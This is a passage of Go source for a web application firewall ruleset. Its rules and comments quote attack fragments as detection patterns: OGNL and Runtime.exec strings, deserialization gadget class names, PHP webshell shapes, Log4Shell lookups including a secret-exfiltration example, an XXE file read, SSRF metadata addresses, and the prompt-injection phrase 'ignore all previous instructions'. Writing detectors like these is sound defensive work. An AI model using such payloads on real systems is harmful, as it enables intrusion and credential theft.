			// has no benign reading. It is not "a value that mentions Java", it
			// is a value asking for Runtime.exec.
			Op: op.ContainsAny(
				"@java.lang.runtime@", "@ognl.ognlcontext@", "@java.lang.system@",
				"t(java.lang.runtime)", "t(java.lang.system)",
				// No space in "java.lang.processbuilder": the transform chain
				// strips whitespace before matching, so "new java.lang.Process
				// Builder(...)" arrives as one run of bytes. A literal written
				// with the space in it matched nothing, and the corpus caught
				// it -- which is the argument for adding the case before
				// believing the rule.
				"getruntime().exec", "java.lang.processbuilder",
				"@org.apache.commons.io.ioutils@", "_memberaccess",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Expression-language injection reaching the JVM runtime",
			Tags:       []string{"rce", "ognl", "spel", "owasp-a03"},
		},
		{
			ID:         IDJavaGadgetClass,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// Polymorphic deserialization: a document that names the class it
			// wants instantiated. Jackson with default typing enabled, and
			// several YAML and XML binders, will build whatever the input asks
			// for -- so "@class": "com.sun.rowset.JdbcRowSetImpl" plus a
			// dataSourceName pointing at an attacker's LDAP server is remote
			// code execution written as configuration.
			//
			// The class names rather than the "@class" key, because the key is
			// spelled differently by every library ("@class", "@type", "$type",
			// "class") while the gadget set is small and shared. A request that
			// names JdbcRowSetImpl is not doing anything else.
			Op: op.ContainsAny(
				"com.sun.rowset.jdbcrowsetimpl",
				"org.springframework.context.support.classpathxmlapplicationcontext",
				"org.springframework.context.support.filesystemxmlapplicationcontext",
				"com.sun.org.apache.xalan.internal.xsltc.trax.templatesimpl",
				"javax.management.badattributevalueexpexception",
				"org.apache.commons.collections.functors",
				"com.mchange.v2.c3p0.jndi",

				// The Commons-Collections gadget chain (CVE-2015-4852), which
				// is what ysoserial actually emits and what CRS 944240 matches.
				//
				// These are transformer and closure class names, and they are
				// the payload rather than a description of it: a serialized
				// object naming InvokerTransformer is one step from
				// Runtime.exec, and nothing legitimate sends the word
				// "clonetransformer" in a request. Named individually rather
				// than by a "runtime." prefix because that prefix is also an
				// ordinary field name in perfectly innocent JSON.
				"clonetransformer", "forclosure", "instantiatefactory",
				"instantiatetransformer", "invokertransformer",
				"prototypeclonefactory", "prototypeserializationfactory",
				"whileclosure", "chainedtransformer", "constanttransformer",
				"lazymap", "tiedmapentry", "keepalivecache",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Known deserialization gadget class in request value",
			Tags:       []string{"rce", "deserialization", "java", "owasp-a08"},
		},
		{
			ID:         IDPHPDynamicEval,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// PHP evaluating a string it was handed. The web shells all reduce
			// to this: "@eval($_POST['pass'])" is China Chopper in its entirety,
			// and the obfuscated droppers wrap it in one or two decoders so the
			// payload survives a naive scan of the file.
			//
			// "eval(" alone is absent on purpose -- it is a word in JavaScript,
			// in code-sharing sites, and in any discussion of this rule. What is
			// matched is eval *with an error-suppressed or decoded argument*,
			// which is a shape nobody writes deliberately.
			//
			// "eval($_" and "assert($_" extend that same principle rather than
			// relaxing it: the argument is a PHP superglobal, so the shape is
			// "evaluate whatever the client sent". Matching only "@eval(" missed
			// the identical shell written without the error-suppressing "@" --
			// "eval($_POST['x'])" is a complete web shell -- and JavaScript's
			// eval and Python's assert cannot collide, because neither has "$_".
			Op: op.ContainsAny(
				"@eval(", "eval(base64_decode(", "eval(gzinflate(",
				"eval(gzuncompress(", "eval(str_rot13(", "assert(base64_decode(",
				"create_function(", "@assert(",
				"eval($_", "assert($_",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "PHP dynamic code evaluation in request value",
			Tags:       []string{"rce", "webshell", "php", "owasp-a03"},
		},
		{
			ID:         IDPHPPregReplaceEval,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// preg_replace's "/e" modifier evaluated the replacement as PHP.
			// It was removed in PHP 7, which is precisely why it still matters:
			// the installs that never upgraded are the ones being compromised.
			//
			// This is the one shape in the dynamic-eval family a literal cannot
			// express. The modifier rides on *any* pattern, so the old literal
			// "preg_replace('/.*/e" only ever caught the payload that spelled
			// ".*", and "/(.*)/e" or "/x/e" walked past it. Matching "/e" alone
			// is not an option either: after the transform chain lowercases and
			// strips whitespace, an ordinary JSON body carrying "path":"/e"
			// would contain it.
			//
			// So this is the L2 fallback working as designed rather than an
			// exception to it -- RE2, linear time, and prefiltered on the
			// "preg_replace(" literals the pattern requires, so a request
			// without them never reaches the regex. The alternation is spelled
			// out per quote style because RE2 has no backreferences.
			Op:         rx.MustNew(`preg_replace\('[^']{0,200}/e'|preg_replace\("[^"]{0,200}/e"`),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "PHP preg_replace /e code evaluation in request value",
			Tags:       []string{"rce", "webshell", "php", "owasp-a03"},
		},
		{
			ID:         IDRemoteFileInclusion,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// Remote file inclusion: a parameter whose value is a URL to a
			// script. The vulnerable include() fetches it and the interpreter
			// runs it, which is how TimThumb and a decade of plugin bugs became
			// mass compromises.
			//
			// The predicate requires *both* halves -- an absolute URL and a
			// script extension at its end -- because a parameter holding a URL
			// is ordinary (callbacks, avatars, webhooks) and only the script
			// extension makes it an inclusion. A trailing "?" or NUL is
			// tolerated, since both are used to hide the extension from a naive
			// suffix check while the interpreter still sees it.
			Op:         remoteFileInclusion(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Remote file inclusion URL in request value",
			Tags:       []string{"rce", "rfi", "owasp-a03"},
		},
		{
			ID:         IDLog4ShellLookup,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// A Log4j lookup in a request value (CVE-2021-44228). Still the most
			// exploited vulnerability in the corpus of things scanners throw at
			// everything, five years on, because the payload travels in whatever
			// field eventually gets logged -- User-Agent, Referer, a username.
			// That is why this reads argTargets, which includes headers.
			//
			// Two shapes, because the obfuscation is not an edge case, it is the
			// norm. "${jndi:ldap://…}" is the literal form. The evasion splits
			// the scheme across nested lookups -- "${${lower:j}ndi:…}",
			// "${${::-j}ndi:…}" -- and no substring of "jndi" survives it. So the
			// nesting primitives are matched directly: ${lower:, ${upper:, ${::-
			// exist to rewrite a string at lookup time and have no reason to
			// appear in a value a client sent.
			// "${env:" and "${sys:" were in this list and were removed. They are
			// real Log4j lookups, but the exfiltration form that uses them --
			// "${jndi:ldap://x/${env:AWS_SECRET_KEY}}" -- already contains
			// "jndi:", so they added no coverage while carrying a benign
			// reading: a configuration API that stores "${env:HOME}" as a value
			// is doing something ordinary. Prefer deleting a rule over adding an
			// exception to it (CLAUDE.md §6).
			Op:         op.ContainsAny("jndi:", "${lower:", "${upper:", "${::-"),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Log4j lookup expression in request value",
			Tags:       []string{"rce", "jndi", "cve-2021-44228", "owasp-a03"},
		},
		{
			ID:         IDJavaDeserialization,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// A Java serialized object stream. The format begins with the magic
			// 0xAC 0xED followed by a two-byte version, and base64 of those bytes
			// begins "rO0AB" -- which is why that five-character string is a
			// reliable fingerprint rather than a guess.
			//
			// Anchored at the start of the value, not merely contained in it.
			// Five base64 characters would otherwise collide by chance inside a
			// long enough blob, and a serialized stream that does not begin with
			// its own magic is not one. The anchor is what makes this Certain.
			Op:         javaSerializedStream(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Java serialized object in request value",
			Tags:       []string{"rce", "deserialization", "owasp-a08"},
		},
		{
			ID:         IDPHPObjectInjection,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// PHP object injection: a serialized object or array reaching
			// unserialize(). The gadget chains that turn this into RCE are
			// library-provided (PHPGGC ships them for Laravel, Symfony, Monolog,
			// Doctrine), so the payload is ordinary-looking serialized data and
			// the exploit lives in whatever classes the target has loaded.
			//
			// The simulation that prompted this rule showed why it is needed
			// separately: a Laravel gadget chain *was* blocked, but only because
			// the sample happened to contain "id;uname", which the command
			// injection detector read as a shell command. Replace that with
			// "phpinfo" and the same gadget went through. A rule that fires on a
			// coincidence is not coverage.
			Op:         phpSerializedObject(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "PHP serialized object in request value",
			Tags:       []string{"rce", "deserialization", "php", "owasp-a08"},
		},
		{
			ID:         IDSpring4Shell,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// Spring4Shell (CVE-2022-22965). Data binding walks a property path
			// from the request into the bean, and "class.module.classLoader"
			// walks out of the bean and into Tomcat's logging configuration,
			// where the attacker writes a JSP. The payload is a *parameter name*,
			// which is why argTargets carrying TargetArgNames matters here.
			Op:         op.ContainsAny("class.module.classloader", "class.classloader"),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Spring class loader property path in request",
			Tags:       []string{"rce", "cve-2022-22965", "owasp-a03"},
		},
		{
			ID:         IDPrototypePollution,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// Prototype pollution: a key that reassigns Object.prototype, so a
			// property the application never set appears on every object in the
			// process. Usually privilege escalation ({"__proto__":{"isAdmin":
			// true}}), sometimes RCE when a downstream template or child_process
			// option is read off the prototype.
			//
			// "__proto__" as a *key* has no legitimate use in a request: JSON has
			// no prototypes, and an API that wants a field called __proto__ has a
			// naming problem rather than a security requirement. In a *value* it
			// is a word, which is why the JSON body parser emitting object keys
			// into TargetArgNames is what makes this rule precise.
			Op: op.ContainsAny(
				"__proto__", "constructor.prototype", "constructor][prototype",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Prototype pollution key in request",
			Tags:       []string{"prototype-pollution", "javascript", "owasp-a08"},
		},
		{
			ID:         IDSSRFMetadata,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// Cloud instance metadata. Reaching 169.254.169.254 from a request
			// parameter returns the instance's IAM credentials, which is why it
			// is the first thing tried against any endpoint that fetches a URL.
			//
			// The link-local addresses are literals with no benign reading: a
			// client has no reason to name the server's own metadata service.
			// Note what is *not* here -- gwaf does not resolve hostnames, so an
			// attacker-controlled name that resolves to 169.254.169.254 is not
			// covered and cannot be. DNS is a network call, and the third
			// ownership test puts it with the embedder.
			Op: op.ContainsAny(
				"169.254.169.254", "metadata.google.internal",
				"169.254.170.2", "100.100.100.200", "metadata.tencentyun.com",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Cloud metadata endpoint in request value",
			Tags:       []string{"ssrf", "cloud-metadata", "owasp-a10"},
		},
		{
			ID:         IDSSRFScheme,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// URL schemes that exist to speak a protocol, not to fetch a page.
			// gopher:// lets an SSRF write arbitrary bytes to a TCP socket, which
			// is how a fetch becomes a Redis command or an SMTP session; dict://
			// is the same trick with a smaller alphabet.
			//
			// "file://" is deliberately absent: it appears in documentation, in
			// desktop-application links, and in error messages people paste into
			// support tickets. The local-file case is already covered by the
			// traversal and sensitive-file rules, which look at what is being
			// read rather than at the scheme naming it.
			// "ldap://" and "jar:" were in this list and were removed. Both are
			// genuine SSRF vectors and both have a plain benign reading that the
			// benign corpus cannot show, because the corpus is derived from one
			// adopter (boundaries.md): an identity API configuring a directory
			// server sends "ldap://ldap.corp.example.com" as data, and Java
			// tooling passes "jar:file:///…" around routinely. The JNDI attack
			// that "ldap://" was standing in for is matched by IDLog4ShellLookup
			// on "jndi:", which has no such reading.
			//
			// What is left is the pair with no legitimate use in a request:
			// both exist to speak a byte protocol, not to fetch a document.
			Op:         op.ContainsAny("gopher://", "dict://"),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Protocol-smuggling URL scheme in request value",
			Tags:       []string{"ssrf", "owasp-a10"},
		},
		{
			ID:         IDXMLEntity,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// An inline entity declaration in a request body is XML external
			// entity injection or an expansion bomb. There is no third thing it
			// is: a client sending data declares elements, never entities, and
			// a document that needs entities defines them in a schema the
			// server already has.
			//
			// This covers both shapes at once. "<!ENTITY x SYSTEM 'file:///etc/passwd'>"
			// reads a file the request had no business reading, and
			// "<!ENTITY lol '&lol;&lol;...'>" expands until the parser runs out
			// of memory. Whitespace is stripped by the chain, so the spacing
			// variants collapse together.
			Op:         op.ContainsAny("<!entity", "<!element", "%remote;", "<!attlist"),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "XML entity declaration in request",
			Tags:       []string{"xxe", "dos", "owasp-a05"},
		},

		// ---- Response leaks --------------------------------------------------
		//
		// These are the reason a response phase exists. They detect what leaves
		// rather than what arrives, which is a different question: not "is this
		// an attack" but "did the origin just disclose something".
		//
		// All three are High rather than Certain. Each has a narrow class of
		// application for which the content is the product — a paste bin, an
		// error-tracking API, a database console — and those deployments should
		// scope an exception rather than have the tier lowered for everyone.
		{
			ID:      IDPromptInjection,
			Phase:   types.PhaseRequestHeaders,
			Targets: argTargets,
			// URLDecode only, and the omissions are both deliberate.
			//
			// decodeChain strips whitespace, which is right for a SQL keyword
			// and fatal here: "ignore all previous instructions" arrives as one
			// run of letters, so every multi-word phrase stops matching and the
			// imperative structure the detector reads is gone. Lowercase is
			// omitted because the detector folds case itself, and reusing the
			// chain detect/shelli already uses avoids paying for a new
			// (chain × target) materialisation over every request.
			Transforms: []rules.Transform{transform.URLDecode},
			// Prompt injection: text that tries to override the instructions an
			// LLM was given. Number one on the OWASP Top 10 for LLM Applications
			// since the list existed, including the 2026 edition grounded in
			// 7,714 real incidents.
			//
			// The detector scores *imperative structure*, not vocabulary, for
			// the same reason detect/ssti scores what is evaluated rather than
			// the delimiters around it. "Ignore all previous instructions"
			// fires; "the attack works by telling the model to ignore previous
			// instructions" does not, and the benign corpus asserts it.
			Op:      promptinjection.Operator(),
			Actions: []rules.Action{rules.Block},
			// Warning rather than Critical: the consequence is the model doing
			// something it should not, which is real but is not the origin
			// executing attacker code.
			Severity: types.SeverityWarning,
			// High, not Certain, and the distinction is honest rather than
			// cautious. An application whose whole purpose is discussing prompts
			// -- a red-team console, an evaluation harness, a prompt library --
			// produces true matches that are not attacks. Those deployments
			// scope an exception to the field carrying prompts, the same answer
			// detect/shelli gives a CI platform carrying shell commands as data.
			Confidence: types.High,
			Msg:        "Prompt injection in request value",
			Tags:       []string{"llm", "prompt-injection", "owasp-llm01", "semantic"},
		},
		{
			ID:         IDSystemPromptLeak,
			Phase:      types.PhaseResponseBody,
			Targets:    responseTargets,
			Transforms: []rules.Transform{transform.Lowercase},
			// System Prompt Leakage -- a new entry in the 2026 OWASP LLM list --
			// caught on the way out. The request-side rule above blocks the ask;
			// this blocks the answer, which is the half that still matters when
			// the ask arrived in a form nobody anticipated.
			//
			// The markers are the framing of a system prompt rather than its
			// content, because the content is different for every deployment and
			// the framing is not: a response that starts explaining "you are a
			// helpful assistant. you must never" is reciting instructions, not
			// answering a question.
			Op: op.ContainsAny(
				"you are a helpful assistant", "your system prompt is",
				"my system prompt is", "my instructions are as follows",
				"you must never reveal", "do not reveal these instructions",
				"<|im_start|>system", "### system:",
			),
			Actions:  []rules.Action{rules.Block},
			Severity: types.SeverityWarning,
			// High for the same reason as above, plus one specific to responses:
			// documentation about building assistants legitimately quotes this
			// phrasing, and a docs site is a plausible thing to sit behind gwaf.
			Confidence: types.High,
			Msg:        "System prompt disclosed in response",
			Tags:       []string{"llm", "disclosure", "owasp-llm07"},
		},
		{
			ID:         IDLeakPrivateKey,
			Phase:      types.PhaseResponseHeaders,
			Targets:    responseTargets,
			Transforms: []rules.Transform{transform.Lowercase},
			// A certificate is public and appears in responses legitimately; a
			// private key is the opposite of public and appears in one only by
			// mistake.
			Op: op.ContainsAny(
				"-----begin rsa private key", "-----begin dsa private key",
				"-----begin ec private key", "-----begin openssh private key",
				"-----begin pgp private key", "-----begin private key",
				"-----begin encrypted private key",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.High,
			Msg:        "Private key in response",
			Tags:       []string{"leak", "response", "owasp-a02"},
		},
		{
			ID:         IDLeakStackTrace,
			Phase:      types.PhaseResponseHeaders,
			Targets:    responseTargets,
			Transforms: []rules.Transform{transform.Lowercase},
			// A stack trace hands an attacker the framework, the version, the
			// filesystem layout, and often the query that failed. Each literal
			// pairs a marker with its context so the word alone does not match:
			// "panic:" is a word, "panic:" beside "goroutine" is Go leaking.
			Op: op.ContainsAny(
				"goroutine 1 [running]", "\npanic: runtime error",
				"traceback (most recent call last)",
				"at java.lang.", "at org.springframework.",
				"system.nullreferenceexception", "at system.web.",
				"fatal error: uncaught", "stack trace:\n#0",
				"activerecord::", "django.core.exceptions",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityError,
			Confidence: types.High,
			Msg:        "Stack trace in response",
			Tags:       []string{"leak", "response", "owasp-a05"},
		},
		{
			ID:         IDLeakSQLError,
			Phase:      types.PhaseResponseHeaders,
			Targets:    responseTargets,
			Transforms: []rules.Transform{transform.Lowercase},
			// A database error in a response is how an attacker confirms an
			// injection landed and then reads the schema back one message at a
			// time. It is the feedback channel that makes blind injection
			// unnecessary.
			Op: op.ContainsAny(
				"you have an error in your sql syntax",
				"warning: mysql_", "unclosed quotation mark after",
				"quoted string not properly terminated",
				"pg::syntaxerror", "sqlstate[", "ora-0", "ora-1",
				"microsoft ole db provider for sql server",
				"sqlite3::sqlexception", "psycopg2.errors",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.High,
			Msg:        "Database error in response",
			Tags:       []string{"leak", "response", "sqli", "owasp-a03"},
		},

		// ---- Hostile clients -------------------------------------------------
		{
			ID:         IDScannerUserAgent,
			Phase:      types.PhaseRequestHeaders,
			Targets:    []types.Target{{Kind: types.TargetRequestHeaders, Name: "User-Agent"}},
			Transforms: []rules.Transform{transform.Lowercase},
			Op: op.ContainsAny(
				"sqlmap", "nikto", "acunetix", "nessus", "masscan",
				"nmap scripting engine", "dirbuster", "wpscan",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Known vulnerability scanner",
			Tags:       []string{"scanner", "reputation"},
		},
	}
}

// bodyPhaseOffset is added to a request-headers rule's ID to derive the ID of
// its request-body counterpart.
//
// The pairing is by construction rather than by hand. Hand-written duplicates
// drift: the first version of this ruleset mirrored two of the ten injection
// rules into the body phase, so a payload that was blocked in a query string
// sailed through in a JSON body. The evasion corpus caught it, and generating
// the pair removes the class of mistake rather than the instance.
const bodyPhaseOffset types.RuleID = 900

// mirrorToBody returns the request-body counterpart of a request-headers rule.
//
// Only the targets and phase change: an injection payload is the same payload
// whether it arrives in a query string or a JSON body, so the operator,
// transform chain, severity, and confidence are shared.
func mirrorToBody(r rules.Rule) rules.Rule {
	m := r
	m.ID = r.ID + bodyPhaseOffset
	m.DerivedFrom = r.ID
	m.Phase = types.PhaseRequestBody
	m.Targets = bodyTargetsFor(r.Targets)
	m.Msg = r.Msg + " (body)"
	return m
}

// bodyTargetsFor derives the body-phase targets from what the original rule
// actually read.
//
// This used to assign bodyTargets unconditionally, which silently *widened*
// every mirrored rule to inspect argument values, argument names, and the raw
// body — whatever the original had been scoped to. That is harmless while every
// rule reads everything, and wrong the moment one does not: the NoSQL rules read
// parameter names only, because "$ne" in a name is an injected query operator
// while the same bytes in a value are somebody typing about MongoDB. Widening
// them produced exactly that false positive.
//
// A mirror must inspect the body-phase equivalent of its original, never more.
func bodyTargetsFor(src []types.Target) []types.Target {
	var readsValues, readsNames bool
	for _, t := range src {
		switch t.Kind {
		case types.TargetArgs:
			if t.Name == "" {
				readsValues = true
			}
		case types.TargetArgNames:
			readsNames = true
		}
	}

	out := make([]types.Target, 0, len(bodyTargets))
	if readsValues {
		// ARGS at phase 2 carries query and body arguments merged; the raw body
		// covers formats the argument parsers do not decompose.
		out = append(out,
			types.Target{Kind: types.TargetArgs},
			types.Target{Kind: types.TargetRequestBody})
	}
	if readsNames {
		out = append(out, types.Target{Kind: types.TargetArgNames})
	}
	return out
}

// withBodyPhase returns set plus a request-body counterpart for every rule that
// inspects attacker-supplied argument values.
//
// Selection is by what a rule *reads*, not by what it is tagged. An earlier
// version keyed off a list of tags, and that list is exactly the kind of thing
// that goes stale silently: the XXE rule was added with an "xxe" tag, no tag
// matched, no body counterpart was generated, and an entity declaration in a
// JSON or XML body went uninspected. Nothing failed — the rule simply was not
// there.
//
// Reading the targets removes the class of mistake rather than the instance,
// which is the same reason these rules are generated instead of hand-written.
// A rule that inspects the request path or one named header has no body
// equivalent and is left alone; mirroring it would produce a rule that can
// never match.
func withBodyPhase(set rules.Set) rules.Set {
	out := make(rules.Set, 0, len(set)*2)
	out = append(out, set...)

	for _, r := range set {
		if r.Phase != types.PhaseRequestHeaders {
			continue
		}
		if !readsArgs(r) {
			continue
		}
		out = append(out, mirrorToBody(r))
	}
	return out
}

// responsePhaseOffset derives a response-body rule's ID from its header-phase
// original, mirroring bodyPhaseOffset on the request side.
const responsePhaseOffset types.RuleID = 100

// withResponsePhase returns set plus a response-body counterpart for every
// response-headers rule.
//
// Symmetric with withBodyPhase, and for the same reason. A leak rule wants to
// read both the headers and the body, but the body does not exist yet at the
// header phase — so the header-phase rule reads headers, and a generated
// counterpart reads both once the body is available.
//
// The header-phase version is what lets an embedder stop a leaking response
// before any of it is written. The body-phase version is what catches the
// leak that was in the body all along.
func withResponsePhase(set rules.Set) rules.Set {
	out := make(rules.Set, 0, len(set)+8)
	out = append(out, set...)

	for _, r := range set {
		if r.Phase != types.PhaseResponseHeaders {
			continue
		}
		m := r
		m.ID = r.ID + responsePhaseOffset
		m.Phase = types.PhaseResponseBody
		m.Targets = responseBodyTargets
		m.Msg = r.Msg + " (body)"
		out = append(out, m)
	}
	return out
}

// readsArgs reports whether a rule inspects attacker-supplied arguments —
// their values, their names, or both — which is what makes a body counterpart
// meaningful.
//
// Names count. A JSON object key arrives only at the body phase, so a rule that
// reads names and is not mirrored inspects query-string names and nothing else:
// it would catch "?password[$ne]=1" and miss {"password":{"$ne":null}}, which
// is the far more common form of the same attack.
func readsArgs(r rules.Rule) bool {
	for _, t := range r.Targets {
		switch t.Kind {
		case types.TargetArgs:
			if t.Name == "" {
				return true
			}
		case types.TargetArgNames:
			return true
		}
	}
	return false
}

// javaSerializedStream reports a Java serialized object stream.
//
// The wire format opens with the magic 0xAC 0xED and a two-byte version, so a
// raw stream starts with those bytes and a base64-encoded one starts with
// "rO0AB". Both forms are anchored at the start of the value rather than merely
// contained in it: five base64 characters occur by chance inside a long enough
// blob, and a stream that does not begin with its own magic is not a stream.
// The anchor is what lets this ship at Certain.
//
// The literal hint is the prefilter's promise (docs/RULES.md §5). "ro0ab" is
// the lowercased form because the transform chain lowercases before matching,
// and the raw magic is unaffected by case folding.
func javaSerializedStream() rules.Operator {
	return op.Func("java_serialized_stream", func(v []byte) bool {
		// Leading whitespace is already gone -- the chain strips it -- but a
		// value quoted inside another encoding can still arrive with padding.
		for len(v) > 0 && (v[0] == '"' || v[0] == '\'') {
			v = v[1:]
		}
		if len(v) >= 4 && v[0] == 0xac && v[1] == 0xed {
			return true
		}
		return len(v) >= 5 && string(v[:5]) == "ro0ab"
	}).WithLiterals("ro0ab", "\xac\xed")
}

// phpSerializedObject reports PHP serialized data reaching unserialize().
//
// The grammar is small and rigid, which is what makes it recognisable without
// enumerating anything: an object is O:<len>:"<name>":<count>:{…} and an array
// is a:<count>:{…}, and the members inside are s:<len>:"…"; i:<n>; b:<0|1>;
// d:<float>; or N;. Matching the *header shape* rather than a list of gadget
// class names is the difference between covering PHPGGC and covering the
// version of PHPGGC that existed when the rule was written.
//
// A bare "a:2:{" is required to be followed by a member, so JSON and prose
// containing a colon after a letter do not reach the predicate. The literals
// are the member separators, which are rare outside serialized data: a
// semicolon or brace immediately followed by a type tag and a colon.
func phpSerializedObject() rules.Operator {
	return op.Func("php_serialized_object", func(v []byte) bool {
		for i := 0; i+3 < len(v); i++ {
			// Object header: o:<digits>:"
			if v[i] == 'o' || v[i] == 'a' {
				// Not part of a longer word -- "foo:1:" is not a header.
				if i > 0 && isWordByte(v[i-1]) {
					continue
				}
				if v[i+1] != ':' {
					continue
				}
				j := i + 2
				for j < len(v) && v[j] >= '0' && v[j] <= '9' {
					j++
				}
				if j == i+2 || j >= len(v) || v[j] != ':' {
					continue
				}
				j++
				if j >= len(v) {
					continue
				}
				// O:<len>:"name" -- an object names its class.
				// a:<count>:{ -- an array opens its members directly.
				if v[i] == 'o' && v[j] == '"' {
					return true
				}
				if v[i] == 'a' && v[j] == '{' {
					return true
				}
			}
		}
		return false
	}).WithLiterals(";s:", ";i:", ";b:", ";d:", "{s:", "{i:", ":{s:")
}

// isWordByte reports whether b can be part of an identifier, so a type tag
// preceded by one is a suffix rather than a header.
func isWordByte(b byte) bool {
	return b >= 'a' && b <= 'z' || b >= 'A' && b <= 'Z' ||
		b >= '0' && b <= '9' || b == '_'
}

// LoopbackSSRFRule reports a loopback or link-local target in a request value.
//
// It is not in the default ruleset and that is a measurement, not caution.
// "localhost", "127.0.0.1", and "0.0.0.0" are ordinary values in CI
// configuration, staging traffic, developer tooling, and webhook registrations
// pointed at a tunnel — the benign corpus carries them — so a core rule
// matching them would be the one that gets the WAF switched off in week one
// (CLAUDE.md §2b, rule 8).
//
// An embedder who knows their API never legitimately fetches a loopback address
// knows something gwaf cannot know from one request, so they opt in:
//
//	waf, err := gwaf.New(gwaf.WithRuleset(
//	    rules.Set{core.LoopbackSSRFRule(11003)},
//	))
//
// Only the extra rule: WithRuleset accumulates onto the default set rather than
// replacing it, so passing core.Default() as well defines every core rule twice
// and fails to compile with a duplicate-ID error.
//
// The decimal and hexadecimal forms are included because 2130706433 and
// 0x7f000001 are 127.0.0.1 to every URL parser and to no human reviewer.
func LoopbackSSRFRule(id types.RuleID) rules.Rule {
	return rules.Rule{
		ID:         id,
		Phase:      types.PhaseRequestHeaders,
		Targets:    argTargets,
		Transforms: decodeChain,
		Op: op.ContainsAny(
			"127.0.0.1", "localhost", "0.0.0.0", "[::1]",
			"2130706433", "0x7f000001", "169.254.", "::ffff:127.",
		),
		Actions:    []rules.Action{rules.Block},
		Severity:   types.SeverityError,
		Confidence: types.Medium,
		Msg:        "Loopback or link-local address in request value",
		Tags:       []string{"ssrf", "owasp-a10", "opt-in"},
	}
}

// crlfHeaderInjection reports a line break followed by something header-shaped.
//
// The pair is the point. A bare newline is ordinary in any multi-line text
// field — a comment, a description, an address — so matching one would make
// every textarea a false positive. A newline followed by "set-cookie:" is a
// value that has been reflected into a response header and terminated it early,
// and there is no benign way to write that.
func crlfHeaderInjection() rules.Operator {
	return op.Func("crlf_header_injection", func(v []byte) bool {
		for i := 0; i < len(v); i++ {
			if v[i] != '\r' && v[i] != '\n' {
				continue
			}
			j := i
			for j < len(v) && (v[j] == '\r' || v[j] == '\n') {
				j++
			}
			// Optional leading space: header continuation lines are folded
			// with one, and an attacker gets the same effect either way.
			for j < len(v) && (v[j] == ' ' || v[j] == '\t') {
				j++
			}
			// A header name is letters and hyphens, then a colon.
			k := j
			for k < len(v) && (v[k] >= 'a' && v[k] <= 'z' || v[k] == '-') {
				k++
			}
			if k > j && k < len(v) && v[k] == ':' {
				return true
			}
		}
		return false
	}).WithLiterals(
		"\nset-cookie:", "\rset-cookie:", "\nlocation:", "\rlocation:",
		"\ncontent-type:", "\rcontent-type:", "\ncontent-length:",
		"\rcontent-length:", "\nrefresh:", "\nlink:",
	)
}

// remoteFileInclusion reports a parameter value that is a URL to a script.
//
// Both halves are required. A parameter holding a URL is ordinary — avatars,
// callbacks, webhook targets, canonical links — and only the script extension
// at the end makes it something an include() would execute. Requiring the pair
// is what keeps this at Certain instead of blocking every integration.
func remoteFileInclusion() rules.Operator {
	scheme := func(v []byte) int {
		for _, s := range []string{"http://", "https://", "ftp://", "ftps://"} {
			if len(v) >= len(s) && string(v[:len(s)]) == s {
				return len(s)
			}
		}
		return -1
	}
	return op.Func("remote_file_inclusion", func(v []byte) bool {
		// The URL may be the whole value or follow an "=" inside it.
		for start := 0; start < len(v); start++ {
			if start > 0 && v[start-1] != '=' && v[start-1] != ',' {
				continue
			}
			if scheme(v[start:]) < 0 {
				continue
			}
			// Cut at the first byte that ends a path: "?" and NUL are both
			// used to hide the extension from a suffix check while the
			// interpreter still resolves it.
			end := start
			for end < len(v) && v[end] != '?' && v[end] != 0 && v[end] != '#' {
				end++
			}
			path := v[start:end]
			for _, ext := range []string{
				".php", ".phtml", ".php3", ".php4", ".php5", ".php7", ".phps",
				".inc", ".jsp", ".jspx", ".asp", ".aspx", ".cfm", ".cgi",
			} {
				if len(path) >= len(ext) && string(path[len(path)-len(ext):]) == ext {
					return true
